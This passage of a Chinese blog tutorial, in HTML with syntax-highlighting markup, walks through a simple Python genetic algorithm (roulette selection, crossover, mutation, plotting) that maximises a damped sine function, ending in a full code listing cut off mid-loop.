punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="定义变异方法"><a href="#定义变异方法" class="headerlink" title="定义变异方法"></a>定义变异方法</h2><blockquote><p>即使基因突变的概率极小，但也需要定义一个基因突变方法：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#变异算子</span><span class="token comment" spellcheck="true">#offspring为交叉后的种群，pm为基因变异概率</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="开始迭代进化"><a href="#开始迭代进化" class="headerlink" title="开始迭代进化"></a>开始迭代进化</h2><blockquote><p>主函数如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#通过matplotlib库绘出函数图形</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover 交叉</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation 变异</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过平均值表示迭代进化</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过最小值表示迭代进化</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过最大值表示迭代进化</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><p>遗传算法实例运行效果如下：</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018180316.png" alt=""></p><blockquote><p>现在对遗传算法也大概有个简单的了解啦，暂时到这儿。</p></blockquote><p>附上完整代码：<a href="https://github.com/Yof3ng/algorithm/blob/master/SGA.py" target="_blank" rel="noopener">https://github.com/Yof3ng/algorithm/blob/master/SGA.py</a></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">def</span> <span class="token function">FuncMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    xx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>    yy<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#通过循环计算每一个x值对应的y值</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> xx<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">)</span>        yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">return</span> max<span class="token punctuation">(</span>yy<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#根据函数原型计算表现型（y值)，即适应度</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#通过循环计算每一个x值对应的y值</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#由于是计算最大值，若存在正数则直接去除负数个体</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population<span class="token comment" spellcheck="true">#解码</span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#print(population)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#将二进制转换为整型数值</span>        x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>        Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>        <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>    <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation    <span class="token comment" spellcheck="true">#return express</span>    <span class="token comment" spellcheck="true"># print(bx[0:100])</span>    <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span><span class="token comment" spellcheck="true">#初始化个体</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population<span class="token comment" spellcheck="true">#定义物竞天择,弱者淘汰</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#轮盘赌选择,染色体累计概率</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#进行选择，淘汰弱者，获取新种群</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#留下优秀个体</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span><span class="token comment" spellcheck="true">#交叉算子</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring<span class="token comment" spellcheck="true">#变异算子</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#通过matplotlib库绘出函数图形</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover 交叉</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation 变异</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token 